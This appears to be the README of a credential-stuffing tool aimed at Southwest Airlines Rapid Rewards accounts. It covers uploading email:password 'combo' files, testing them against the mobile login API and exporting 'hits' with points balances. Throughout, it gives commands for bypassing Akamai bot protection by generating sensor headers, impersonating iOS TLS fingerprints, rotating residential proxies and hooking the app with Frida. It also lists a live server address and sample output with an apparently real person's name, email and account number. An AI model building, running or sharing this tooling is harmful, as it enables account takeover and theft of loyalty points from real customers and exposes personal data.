# Southwest Rapid Rewards Points Checker

Checks Southwest Airlines Rapid Rewards account balances using the mobile API (`mobile.southwest.com`).

## How it works

1. Capture a login session from the Southwest iOS app using Charles Proxy
2. Extract Akamai sensor headers from the `.chlz` capture
3. Reuse those headers to authenticate accounts and read points from the login response

The login endpoint returns full account info including redeemable points, tier status, and companion pass progress — no separate points API call needed.

## Web UI (dedicated server)

Full checker UI with large combo upload, resume progress, hits export, and live stats.

```bash
# Local dev
npm install
pip install -r requirements.txt
bash run.sh
# Open http://localhost:8093

# Deploy to dedi
BRANCH=cursor/southwest-checker-web-ui-1af1 PORT=8093 bash deploy/deploy.sh
```

**Live:** http://159.69.76.189:8093

Features:
- Upload large combo files (streamed to disk, not loaded in browser)
- Resume checked combos across restarts
- APIGuard full bootstrap (default) or capture template mode
- Smoke test, CPM stats, hits copy/export

## Setup

```bash
pip install -r requirements.txt
npm install
```

## Usage

### Step 1: Extract sensor headers from a Charles capture

Capture a successful login from the Southwest iOS app in Charles Proxy, then export/save the session as a `.chlz` file.

```bash
python -m southwest_checker extract capture.chlz -o sensor_config.json
```

This extracts the Akamai APIGuard sensor headers (`X-dUblrIiu-*`) required to bypass bot protection.

### Step 2: Check accounts

Single account:

```bash
python -m southwest_checker check -c sensor_config.json -u gulley88 -p 'YourPassword'
```

Combo file (`email:password` or `username:password` per line — emails auto-convert to username):

```bash
python -m southwest_checker check -c sensor_config.json -f combos.txt --hits-file hits.txt
```

### Proxy (residential rotating)

Use a residential proxy to avoid IP blocks. Supports full URL or shorthand `host:port:user:pass`:

```bash
# Via CLI flag
python -m southwest_checker check -c sensor_config.json -f combos.txt \
  --proxy "core-residential.evomi.com:1000:USER:PASS_country-US"

# Via environment variable
export SW_PROXY="core-residential.evomi.com:1000:USER:PASS_country-US"
python -m southwest_checker check -c sensor_config.json -f combos.txt

# Or store in sensor_config.json
# { "proxy": "host:port:user:pass", ... }
```

Save results as JSON:

```bash
python -m southwest_checker check -c sensor_config.json -f combos.txt --json-output results.json
```

## Output

```
[HIT] gulley88 | Points: 45,230 | Tier: A_LIST | Account: 23305211731 | Name: Dustin Gulley | Email: gulley88@gmail.com
[BAD] baduser | invalid_grant
[RETRY] user123 | Akamai blocked (429) — sensor headers may be expired
```

## API details (from capture)

| Step | Method | Endpoint |
|------|--------|----------|
| Login | POST | `/api/security/v4/security/token` |
| User info | GET | `/api/security/v4/security/userinfo` |

Login body:

```
scope=openid&username=USER&response_type=id_token swa_token&client_id=26f1ee9f-a921-4735-8f5d-856401d6656a&password=PASS
```

Key response fields:

- `customers.userInformation.redeemablePoints`
- `customers.userInformation.tier`
- `customers.userInformation.accountNumber`
- `customers.userInformation.firstName` / `lastName`
- `customers.userInformation.nextTierTargeted`
- `customers.userInformation.companionPassInfo.companionQualifyingPointsRemaining`

## APIGuard sensor generation

The checker can generate APIGuard headers without a Charles capture using init kernel bootstrap, or generate fresh `-e`/`-g` per request using a capture template.

```bash
# Full bootstrap: all session headers from /sw_check/ios/init (no capture needed)
python -m southwest_checker check -u USER -p PASS --full-bootstrap

# Decode a captured header to inspect its contents
python -m southwest_checker decode e "b;...;..."

# Check with auto-generated -e/-g (session headers -a/-c/-d/-f from capture template)
python -m southwest_checker check -c sensor_config.json -u USER -p PASS --auto-sensors
```

### How it works

| Header | Source | Per-request? |
|--------|--------|--------------|
| `-e` | Generated (device sensor JSON + ChaCha encrypt) | Yes |
| `-g` | Generated (iOS signal JSON + ChaCha encrypt) | Yes |
| `-a`, `-b`, `-c`, `-d`, `-f`, `-z` | Init kernel JS bootstrap (`--full-bootstrap`) | Session |
| `-a`, `-c`, `-d`, `-f` | Charles capture template (`--auto-sensors`) | Session |
| `-b`, `-z` | Static constants (capture mode only) | No |

The init endpoint `/sw_check/ios/init` returns `kernelId`, `kernel` (JS), `ck` (LuaJIT modules), and `sk` (session key). With `--full-bootstrap`, a Node.js kernel runner executes the init JS inside jsdom, mocks the iOS webkit bridge, and captures session headers before Python generates fresh `-e`/`-g`.

#### Full bootstrap status

| Component | Status |
|-----------|--------|
| Init fetch + kernel JS execution | Working |
| `pushMinPayload` / `pushMaxPayload` header capture | Working |
| `send` probe handler parse | Fixed (was JSON-parsing an already-parsed array → all 37 probes returned `[]`) |
| `send` probe crypto via `sk` | **Partial** — best native candidate is `native-sess-all` (~40% login pass rate vs ~90% capture mode). Still not production-ready |
| Capture template + fresh `-e`/`-g` | **Working** (recommended for production) |

Native probe reverse engineering (no device capture required) found that probe responses feed into the `-a` header (not `-c`/`-d`). The best computed mode so far HMACs all three probe tokens with the init `sessionKey` left-hand segment:

```bash
# Default full-bootstrap probe mode (override with SW_PROBE_MODE)
SW_PROBE_MODE=native-sess-all python -m southwest_checker check --full-bootstrap -u USER -p PASS

# Benchmark probe modes against live login
python scripts/test_native_probes.py -u USER -p PASS --proxy host:port:user:pass_country-US
```

Optional: capture real probe pairs from an iOS device for replay mode:

```bash
# 1. Run Frida on a jailbroken device during Southwest login
frida -U -f com.southwest.iphoneprod -l deploy/frida_capture_ios_probes.js

# 2. Save captured pairs to data/probe_replay.json (see deploy/probe_replay.template.json)

# 3. Re-run with replay mode (auto-detected when file exists)
SW_PROBE_MODE=replay node southwest_checker/apiguard/kernel_runner.js
```

Probe modes can be tuned via env: `SW_PROBE_MODE` (`replay`, `native-sess-all`, `native-sk-key-hmac`, `hmac-chain`, …) and `SW_PROBE_KEY` (`sk-key`, `sk-xor`).

### Cipher details

Ported from [shape-android](https://github.com/vshbnj/shape-android) APIGuard 3 reverse engineering:

- `-e`: `b;base64(ChaChaCFB(deflate(sensorJSON)))`;base64(key32)`
- `-g`: `base64(ChaChaCFB("1;"+base64(zlib(signalJSON))))`;base64(key32)`;g`
- Key derivation: `key32 XOR "X-dUblrIiu-"`

## Notes

- **Sensor headers expire.** With `--full-bootstrap`, re-run the check to fetch a fresh init kernel. With capture mode, re-run `extract` when you start getting 429 errors.
- **Rate limiting:** Use `--delay 2` (default) or higher between checks to avoid Akamai throttling.
- **TLS fingerprinting:** Uses `curl_cffi` with Safari iOS impersonation to match the mobile app.
